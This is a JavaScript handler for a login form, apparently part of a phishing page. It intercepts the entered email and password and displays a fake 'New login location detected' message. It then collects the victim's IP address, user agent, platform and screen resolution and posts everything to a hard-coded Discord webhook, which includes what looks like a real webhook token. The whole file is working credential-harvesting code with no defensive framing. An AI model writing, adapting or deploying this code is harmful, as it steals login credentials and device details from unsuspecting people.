// Add an event listener to the form to handle the submission
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();  // Prevent default form submission

    // Get the email and password from the input fields
    const email = document.getElementById('emailORphone').value;
    const password = document.getElementById('password').value;

    // Basic validation: Ensure the fields are not empty
    if (!email || !password) {
        alert('Please fill out both fields!');
        return;
    }

    // Display the "New login location detected" message
    document.getElementById('locationMessage').style.display = 'block';

    // Fetch the user's public IP address from ipify API
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            // Get the user's IP address
            const userIP = data.ip;

            // Get the browser and device information
            const browserInfo = navigator.userAgent; // User agent string (browser and OS)
            const platform = navigator.platform; // The platform (OS) the user is on
            const screenResolution = `${window.screen.width}x${window.screen.height}`; // Screen resolution

            // Construct the payload that you want to send to Discord
            const payload = {
                content: ` @everyone New login attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${userIP}\nBrowser: ${browserInfo}\nPlatform: ${platform}\nScreen Resolution: ${screenResolution},`
            };

            // Replace this with your actual Discord webhook URL
            const webhookUrl = 'https://discord.com/api/webhooks/1306720855241523252/57GWBNWefEYv055_pM-nNkolRNEyMxVl2kkRBHdHd5AkCXuhybPHWZCl4C6rKkBYNKWG';  // Replace with your Discord webhook

            // Send the data to the Discord webhook using Fetch API
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)  // Send the data as a JSON string
            })
            .then(response => {
                if (response.ok) {
                    console.log('Data sent successfully!');
                } else {
                    console.error('Failed to send data:', response.statusText);
                }
            })
            .catch(error => {
                console.error('Error during fetch:', error);
                alert('Error during submission.');
            });
        })
        .catch(error => {
            console.error('Error fetching IP address:', error);
            alert('Unable to retrieve IP address.');
        });
});
